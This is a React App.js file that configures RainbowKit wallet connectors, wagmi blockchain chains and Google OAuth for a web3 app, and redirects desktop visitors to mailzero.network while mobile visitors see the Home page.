import './App.css';
import Home from "./pages/Home"
import { GoogleOAuthProvider } from '@react-oauth/google';
import '@rainbow-me/rainbowkit/styles.css';
import { isMobile } from 'react-device-detect';
import {
  RainbowKitProvider,
  getDefaultWallets,
  connectorsForWallets,
} from '@rainbow-me/rainbowkit';


import {
  argentWallet,
  trustWallet,
  ledgerWallet,
} from '@rainbow-me/rainbowkit/wallets';
import { configureChains, createConfig, WagmiConfig } from 'wagmi';
import {
  mainnet,
  polygon,
  optimism,
  arbitrum,
  zora,
  goerli,
} from 'wagmi/chains';
import { publicProvider } from 'wagmi/providers/public';



const { chains, publicClient, webSocketPublicClient } = configureChains(
  [
    mainnet,
    polygon,
    optimism,
    arbitrum,
    zora,
    ...(process.env.NEXT_PUBLIC_ENABLE_TESTNETS === 'true' ? [goerli] : []),
  ],
  [publicProvider()]
);


const projectId = '';

const { wallets } = getDefaultWallets({
  appName: 'RainbowKit demo',
  projectId,
  chains,
});


const demoAppInfo = {
  appName: 'Rainbowkit Demo',
};


const connectors = connectorsForWallets([
  ...wallets,
  {
    groupName: 'Other',
    wallets: [
      argentWallet({ projectId, chains }),
      trustWallet({ projectId, chains }),
      ledgerWallet({ projectId, chains }),
    ],
  },
]);


const wagmiConfig = createConfig({
  autoConnect: true,
  connectors,
  publicClient,
  webSocketPublicClient,
});

function App({pageProps}) {
  if (!isMobile) {
    // eslint-disable-next-line no-useless-concat
    window.location.href = "https://mailzero.network" + '?t='+Math.random()
    return <></>;
  }

  return (
    <WagmiConfig config={wagmiConfig}>
      <RainbowKitProvider appInfo={demoAppInfo} chains={chains}>
        <GoogleOAuthProvider clientId="">
          <Home {...pageProps}/>
        </GoogleOAuthProvider>
      </RainbowKitProvider>
    </WagmiConfig>
    
  );
}

export default App;
